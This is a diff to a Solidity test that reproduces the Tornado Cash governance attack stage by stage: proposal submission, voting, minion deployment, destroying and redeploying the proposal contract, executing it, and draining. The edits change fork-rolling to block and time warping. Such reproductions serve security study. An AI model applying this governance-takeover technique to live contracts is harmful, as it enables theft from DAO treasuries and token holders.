@@ -61,7 +61,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         // 1. Submit the proposal #20 allegating some relayers are cheating the protocol with the
         // Attacker 2
         // https://explorer.phalcon.xyz/tx/eth/0x34605f1d6463a48b818157f7b26d040f8dd329273702a0618e9e74fe350e6e0d?line=0&debugLine=0
-        vm.rollFork(17_249_552);
+        vm.roll(17_249_552);
         console2.log("Submitting proposal...");
         vm.startPrank(ATTACKER2);
         proposalId = TORNADO_GOVERNANCE.propose(
@@ -72,7 +72,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
 
         console2.log("\n======== STAGE 1.1 VOTE PROPOSAL ========");
         console2.log("Locking funds with voter...");
-        cheat.rollFork(17_265_000);
+        cheat.roll(17_265_000);
         deal(address(tornToken), SomeVoter, 300_000 ether);
         assertEq(tornToken.balanceOf(SomeVoter), 300_000 ether, "Voter: torn token balance mismatch");
         vm.startPrank(SomeVoter);
@@ -80,8 +80,9 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         TORNADO_GOVERNANCE.lockWithApproval(tornToken.balanceOf(SomeVoter));
         console2.log("Funds successfully locked \n");
 
-        cheat.rollFork(17_275_000);
         console2.log("Casting vote...");
+        (,, uint256 startTime, uint256 endTime,,,,) = TORNADO_GOVERNANCE.proposals(proposalId);
+        vm.warp(startTime + 1);
         TORNADO_GOVERNANCE.castVote(proposalId, true);
         console2.log("Vote successfully casted");
         vm.stopPrank();
@@ -90,7 +91,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         // 2. Deploy multiple minion contracts with the Attacker Contract and lock zero TORN with
         // each one in the Governance with the Attacker 1
         // https://explorer.phalcon.xyz/tx/eth/0x26672ad9140d11b64964e79d0ed5971c26492786cfe0edf57034229fdc7dc529?line=835&debugLine=835
-        cheat.rollFork(17_285_354);
+        cheat.roll(17_285_354);
         vm.startPrank(ATTACKER1);
         attacker1contract = new Attacker1Contract();
         attacker1contract.deployMultipleContracts(5);
@@ -107,7 +108,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         destroyAccount(address(proposal_20), address(0));
         destroyAccount(address(transientContract), ATTACKER2);
 
-        vm.rollFork(17_299_106);
+        vm.roll(17_299_106);
         console2.log("Fork Block Number: %s", block.number); // just before the redeployment
 
         console2.log("\n======== STAGE 4. REDEPLOY THE PROPOSAL AND TRANSIENT ========");
@@ -126,8 +127,11 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         console2.log("Proposal: %s", address(transientContract).code.length);
 
         console2.log("\n======== STAGE 5. EXECUTE MALICIOUS PROPOSAL ========");
-        cheat.rollFork(17_299_138); // just before the execution
+        
         console2.log("Executing malicious proposal...");
+        (,,, endTime,,,,) = TORNADO_GOVERNANCE.proposals(proposalId);
+        uint256 EXECUTION_DELAY = 172800;
+        vm.warp(endTime + EXECUTION_DELAY+ 1);
         // 5. Execute the malicious proposal in Tornado closing the position of 4 Relayers (the same
         // mentioned in the proposal #20 description)
         // https://explorer.phalcon.xyz/tx/eth/0x3274b6090685b842aca80b304a4dcee0f61ef8b6afee10b7c7533c32fb75486d?line=3&debugLine=3
@@ -148,7 +152,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         // https://explorer.phalcon.xyz/tx/eth/0x13e2b7359dd1c13411342fd173750a19252f5b0d92af41be30f9f62167fc5b94?line=12&debugLine=12
         // The locked balance slots were wrote with 10,000e18 granting that amount of tokens per account
         // This call is made with a for loop over all the minions.
-        cheat.rollFork(17_304_425); // just before the drain
+        cheat.roll(17_304_425); // just before the drain
         address[] memory minions = attacker1contract.getMinions();
 
         console2.log("Before Drain ");
